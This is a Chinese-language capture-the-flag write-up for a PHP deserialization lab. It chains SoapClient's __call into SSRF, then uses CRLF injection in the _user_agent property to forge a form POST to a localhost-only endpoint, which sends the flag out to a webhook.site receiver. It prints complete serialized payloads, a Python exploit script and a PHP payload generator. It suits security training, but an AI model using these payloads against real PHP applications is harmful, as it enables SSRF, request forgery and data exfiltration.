# unserialize-lab · un9（SoapClient SSRF + CRLF 注入）

> 靶场：`http://120.76.159.54:8888/un9.php`
> 环境：Apache/2.4.10 (Debian) + **PHP/5.5.38**
> 结果：`flag{50@p_15_44nny_d0_yo4_know}`

---

## 一、题目

### un9.php

```php
<?php
// POST py=flag&url=yoururl to un92.php and you will get the flag
if (isset($_GET['tryhackme']) && is_string($_GET['tryhackme'])){
    $a = unserialize($_GET['tryhackme']);
    $a->pyflag();
} else {
    show_source(__FILE__);
}
?>
```

### un92.php

```
从公网访问 → REMOTE_ADDR must be 127.0.0.1
从本地访问 → 返回内容（与参数无关）
```

### 提示解读

```
POST py=flag&url=yoururl → un92.php → un92 把 flag 发到 yoururl
```

**→ 需要一个"能读到内容"的接收端**（本 WP 用 webhook.site）。

---

## 二、考点判断（三步推理）

| 看到 | 推出 |
|---|---|
| 有 `unserialize($_GET['tryhackme'])` | 反序列化入口 |
| **源码里没有任何 `class`** | **用 PHP 内置类** |
| 调了**不存在的方法** `pyflag()` | 需要内置类有 `__call` → **只有 `SoapClient`** |
| un92 只允许 `REMOTE_ADDR=127.0.0.1` | 必须**服务器自己**发请求 → **SSRF** |

**结论**：`SoapClient` 的 `__call` 是发 HTTP 请求的，用它做 SSRF。

---

## 三、解题步骤

### 步骤0：准备接收端

```
① 打开 https://webhook.site
② 复制 "Your unique URL"（形如 http://webhook.site/xxxx-xxxx）
```

**替代**：requestcatcher.com、beeceptor.com、自己的公网 VPS（`python3 -m http.server 80`）。

---

### 步骤1：用 SoapClient 打通 SSRF

**原理**：

```php
new SoapClient(null, array('location' => '...', 'uri' => 'x'));
//   ↑ null = 非 WSDL 模式 → 任何方法都能调 → 都走 __call
//     __call 内部：生成 SOAP XML + POST 到 location
```

**最小 payload**：

```
O:10:"SoapClient":2:{s:3:"uri";s:1:"x";s:8:"location";s:25:"http://127.0.0.1/un92.php";}
```

**发送后返回**：

```html
Fatal error: Uncaught SoapFault exception:
[Client] looks like we got no XML document
Stack trace:
#0 un9.php(5): SoapClient->__call('pyflag', Array)     ← __call 触发 ✅
```

**⭐ `no XML document` = 请求发出去了**（un92 有响应，但不是 XML）。

**为什么必须 SSRF**：

```
REMOTE_ADDR 是 TCP 连接的源地址，由内核填写
X-Forwarded-For / X-Real-IP / X-Client-IP 全部无效（实测）
→ 只能让服务器自己发请求，源地址天然是 127.0.0.1
```

---

### 步骤2：找"能注入 HTTP 头"的属性

**`SoapClient` 会把这些属性写进请求头**：

| 属性 | 变成什么头 | 相对 Content-Type 的位置 |
|---|---|---|
| **`_user_agent`** | **`User-Agent`** | ⭐ **之前** |
| `uri` | `SOAPAction` | 之后 |
| `location` | 请求行（URL） | — |

**⭐ 关键**：**`User-Agent` 排在 `Content-Type` 之前** → 从这里注入，我们的 `Content-Type` 会**排在前面** → **HTTP 头"首值优先" → 我们的赢**。

**⚠️ 属性名按 PHP 版本不同**：

| PHP 版本 | 序列化出来的属性名 |
|---|---|
| **PHP 5.x** | **`_user_agent`**（带下划线） |
| PHP 7.x | `user_agent` |

**网上文章都是 PHP 7 写法** → 在本题（PHP 5.5）上照抄**完全无效**。

**本地确认属性名的方法**（php5.4 + soap）：

```php
<?php
$c = new SoapClient(null, array('location'=>'http://x/','uri'=>'y','user_agent'=>'UA'));
echo serialize($c);
// 输出里会出现： s:11:"_user_agent";s:2:"UA";
```

---

### 步骤3：CRLF 注入头 + body

**要注入的内容**（`\r\n` 是真实回车换行）：

```
a\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 【body长度】\r\n
\r\n
py=flag&url=【你的webhook】
```

**拼出来的请求**：

```http
POST /un92.php HTTP/1.1
Host: 127.0.0.1
Connection: Keep-Alive
User-Agent: a                                              ← 注入从这里开始
Content-Type: application/x-www-form-urlencoded            ← ⭐ 我们的（排第一，赢）
Content-Length: 75
                                                           ← 空行（头结束）
py=flag&url=http://webhook.site/xxxx                       ← body
Content-Type: text/xml; charset=utf-8                      ← SoapClient 原本的（落到 body 区，被忽略）
SOAPAction: "x#pyflag"
Content-Length: 370
<?xml ...>
```

**→ PHP 按表单解析 → `$_POST` 有值。**

---

### 步骤4：打 un92，拿 flag

**只把 `location` 换成 `http://127.0.0.1/un92.php`**（不是 webhook）。

```http
POST /un92.php HTTP/1.1        ← 由 SoapClient 发出，源地址 127.0.0.1
body: py=flag&url=http://webhook.site/xxxx
```

**un92 收到后**：
```
REMOTE_ADDR = 127.0.0.1 ✅ 通过检查
$_POST['py'] == 'flag' → 把 $flag 发给 $_POST['url']
```

**webhook 收到**：
```
GET /xxxx?flag=flag{50@p_15_44nny_d0_yo4_know}      🚩
```

---

## 四、完整 payload 与代码

### 4.1 最终 payload（PHP 5.x 格式）

```
O:10:"SoapClient":3:{
  s:11:"_user_agent";s:149:"a\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 75\r\n\r\npy=flag&url=http://webhook.site/你的token";
  s:8:"location";s:25:"http://127.0.0.1/un92.php";
  s:3:"uri";s:1:"x";
}
```

**（实际是一行，`\r\n` 是真实换行符）**

### 4.2 Python 版（6 行，只改 `h`）

```python
import requests
h = "http://webhook.site/你的token"
b = "py=flag&url=" + h
u = "a\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + str(len(b)) + "\r\n\r\n" + b
p = 'O:10:"SoapClient":3:{s:11:"_user_agent";s:' + str(len(u)) + ':"' + u + '";s:8:"location";s:25:"http://127.0.0.1/un92.php";s:3:"uri";s:1:"x";}'
requests.get("http://120.76.159.54:8888/un9.php", params={"tryhackme": p})
```

**逐行含义**：

| 行 | 作用 |
|---|---|
| `h` | 接收端地址（un92 把 flag 发到这） |
| `b` | 要 POST 给 un92 的表单数据（题目提示要求 `py=flag&url=`） |
| `u` | 注入到 `User-Agent` 里的内容：`a` + 换行 + 表单 Content-Type + Content-Length + 空行 + body |
| `p` | 把 `u` 包成 SoapClient 序列化串（长度用 `len()` 自动算） |
| `get` | 发给 un9.php；`params=` 会自动 URL 编码 |

### 4.3 PHP 生成版（自动算长度）

```php
<?php
$target = "http://127.0.0.1/un92.php";
$hook   = "http://webhook.site/你的token";
$body   = "py=flag&url=" . $hook;

$ua = "a\r\n"
    . "Content-Type: application/x-www-form-urlencoded\r\n"
    . "Content-Length: " . strlen($body) . "\r\n"
    . "\r\n"
    . $body;

$c = new SoapClient(null, array(
    'location'   => $target,
    'uri'        => 'x',
    'user_agent' => $ua        // ⚠️ 构造函数用 user_agent，序列化后自动是 _user_agent
));
echo urlencode(serialize($c));
```

**运行**：
```powershell
C:\Users\暗炎魔主\Desktop\php54.bat gen54.php
```
**⚠️ 必须 PHP 5.4**（PHP 8.x 生成的是 36 个 private 属性，格式不兼容）。

---

## 五、序列化格式速查（本项目用到的）

| 规则 | 写法 |
|---|---|
| 对象 | `O:类名长度:"类名":属性个数:{属性们}` |
| 字符串 | `s:长度:"内容"` |
| 多个属性 | **直接连写**，无逗号无空格 |

**本题所有固定数字**：

| 片段 | 长度 |
|---|---|
| `SoapClient` | 10 |
| `_user_agent` | 11 |
| `location` | 8 |
| `http://127.0.0.1/un92.php` | 25 |
| `uri` | 3 |
| `x` | 1 |

**→ 只有 `_user_agent` 的**值**的长度要自己算。**

**本地验证 payload 格式对不对**：

```php
<?php
var_dump(unserialize('你的payload'));
// object(SoapClient) → 格式对 ✅
// bool(false)        → 长度/语法错 ❌
```

---

## 六、4 级验证阶梯（复现/自测用）

**每一步都有验证点，现象对了再往下走。**

| 级别 | 做什么 | 验证点 |
|---|---|---|
| **1** | `location=http://127.0.0.1/un92.php`，不加注入 | 返回 `looks like we got no XML document` = **SSRF 通了** |
| **2** | 注入 `_user_agent = "MYUA\r\nX-Test: HELLO"`，`location=webhook` | webhook 里 `user-agent: MYUA` + 多出 `x-test-inject` = **注入生效** |
| **3** | 注入完整 Content-Type + Content-Length + body，`location=webhook` | webhook 里 `content=py=flag&url=...`、`content-type` 是表单 = **body 可控** |
| **4** | 同上，但 `location=http://127.0.0.1/un92.php` | webhook 里出现 `?flag=...` = **🚩 完成** |

---

## 七、报错对照表

| 报错 / 现象 | 含义 | 处理 |
|---|---|---|
| `looks like we got no XML document` | **请求成功了** | 正常，继续 |
| `... on a non-object` | **反序列化失败** | 检查长度、引号、大括号 |
| `Error finding "uri" property` | 缺 `uri` | 补 `s:3:"uri";s:1:"x";` |
| `Error could not find "location" property` | 缺 `location` | 补上 |
| `Unknown protocol. Only http and https are allowed` | 协议被禁 | 只能用 http/https |
| `[HTTP] Not Found` | 404 | 路径写错 |
| `[HTTP] Could not connect to host` | 端口不通 | 换端口 |
| `[HTTP] Bad request` | 400 | `location` 里别塞 CRLF |
| webhook 一直没收到 | 注入没生效 | 先做第 2、3 级验证 |

---

## 八、踩坑记录

| 坑 | 现象 | 原因 | 解决 |
|---|---|---|---|
| **属性名写成 `user_agent`** | UA 不变，注入完全无效 | PHP 5.x 内部属性名是 `_user_agent` | 用 `_user_agent` |
| **先试了 `uri` 注入** | body 注入成功，但 `Content-Type` 仍是 `text/xml` → un92 收不到参数 | `uri`→`SOAPAction` 排在 `Content-Type` **之后**，HTTP 头**首值优先**，覆盖不了 | 改用 `_user_agent`（排在前面） |
| **用 PHP 8.2 生成 payload** | `O:10:"SoapClient":36:{s:15:"\0SoapClient\0uri";...}` | PHP 8 的属性是 private | 用 PHP 5.4 生成或手写 |
| **curl 直接发 URL** | 响应里 `"` `{}` 全消失 | **curl 的 `{}` URL globbing** | 整体 URL 编码，或 `curl -g` |
| **参数写在 query 里** | un92 不响应 | un92 只认 **`$_POST`** | 必须注入 body |
| **`location` 里塞 CRLF** | `400 Bad Request` | 破坏了请求行 | 只能从 `_user_agent` / `uri` 注入 |
| **用 PowerShell 改 .py 文件** | 中文乱码 → SyntaxError | 编码问题 | 用 VS Code / 记事本改 |

---

## 九、知识点总结

| # | 知识点 |
|---|---|
| 1 | **没有自定义类时用 PHP 内置类**：`SoapClient`（`__call`→SSRF）、`Error`/`Exception`（`__toString`→XSS）、`SimpleXMLElement`（XXE）、`SplFileObject`（读文件）、`DirectoryIterator`（列目录） |
| 2 | **非 WSDL 模式**：`new SoapClient(null, [...])` → 任何方法都能调 → 都走 `__call` |
| 3 | **`SoapClient::__call` 的正常职责就是发 HTTP 请求** → 被滥用成 SSRF |
| 4 | **`REMOTE_ADDR` 是 TCP 层，HTTP 头伪造不了** → 必须 SSRF |
| 5 | **HTTP 头"首值优先"**：想覆盖 `Content-Type`，注入点必须排在它前面 |
| 6 | **`User-Agent` 排在 `Content-Type` 之前** → `_user_agent` 是最佳注入点 |
| 7 | **CRLF 注入**：`\r\n` 能切断头、插入新头、塞 body |
| 8 | **PHP 版本差异**：`_user_agent`(5.x) vs `user_agent`(7.x)；序列化格式 5.x public vs 8.x private |
| 9 | **PHP 的 SOAP 客户端最后才写 `Content-Length`** → 必要的话还能做**HTTP 请求走私**（提前结束请求头，夹带第二个请求） |
| 10 | **curl 的 `{}` globbing** 会静默破坏 payload → 必须 URL 编码 |

---

## 十、迁移：同类题怎么打

```
① 读源码
   ├─ 有没有自定义类？
   │   ├─ 没有 → 找内置类：
   │   │        调方法        → SoapClient（__call → SSRF）
   │   │        对象当字符串   → Error / Exception（__toString）
   │   │        动态 new      → SimpleXMLElement / SplFileObject
   │   └─ 有  → 构造 POP 链（从终点逆推）
   │
② 写最小 payload 验证能不能触发（看报错）
   │
③ 要找"会被写进 HTTP 头"的属性
   │  SoapClient：_user_agent（在前）、uri（在后）
   │
④ 用 CRLF 注入需要的头 + body
   │
⑤ 用 webhook.site 每一步都验证（SSRF 是盲的）
```

---

## 十一、一句话总结

> **un9 = 内置类 `SoapClient` 的 `__call` 做 SSRF，再用 `_user_agent` 属性做 CRLF 注入覆盖 `Content-Type` + 塞入表单 body，让 un92 以 `127.0.0.1` 身份收到 `py=flag&url=你的地址`，把 flag 回调给你。**
>
> **核心一句**：**`User-Agent` 排在 `Content-Type` 前面，而 HTTP 头首值优先 —— 所以从 `_user_agent` 注入就能"抢到" Content-Type。**
